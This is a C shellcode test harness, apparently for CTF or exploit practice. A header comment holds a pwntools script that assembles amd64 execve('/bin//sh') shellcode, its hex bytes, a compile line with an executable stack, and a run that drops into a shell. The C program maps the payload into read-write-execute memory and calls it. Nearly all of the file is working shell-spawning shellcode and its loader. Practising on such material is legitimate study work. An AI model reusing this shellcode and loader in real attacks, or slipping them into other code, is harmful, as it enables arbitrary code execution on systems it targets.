/*
----------------------------------------------------------------------------------------- 
Test shellcode python generator:

from pwn import *
context.arch = 'amd64'  # Set architecture to amd64

# Create the shellcode
shellcode = asm(
    '''
    xor rax, rax
    push rax
    mov rdi, 0x68732f6e69622f2f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x3b
    syscall
    '''
)

# Output the shellcode in a hex format that can be used in CTFs or testing
print(f"Shellcode: {shellcode.hex()}")

# Write the shellcode directly to a binary file
with open('payload.bin', 'wb') as f:
    f.write(shellcode)
-----------------------------------------------------------------------------------------
Run:
----
python3 generate_shellcode.py                                                                
Shellcode: 4831c05048bf2f2f62696e2f7368574889e74831f64831d2b03b0f05


Compilation:
------------
gcc -o test_payload test_payload.c -z execstack

Run:
----
$ ./test_payload               

$ id
uid=1000(xtk)...
-----------------------------------------------------------------------------------------
*/

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <stdlib.h>

int main() {
    // Read the binary data from file
    FILE *fp = fopen("payload.bin", "rb");
    if (!fp) {
        perror("Failed to open file");
        return 1;
    }
    fseek(fp, 0, SEEK_END);
    size_t size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    // Allocate executable memory
    void *buf = mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) {
        perror("Failed to allocate memory");
        fclose(fp);
        return 1;
    }

    // Read the binary into the allocated memory
    fread(buf, 1, size, fp);
    fclose(fp);

    // Execute the binary as a function
    void (*func)() = buf;
    func();

    // Free the memory
    munmap(buf, size);

    return 0;
}
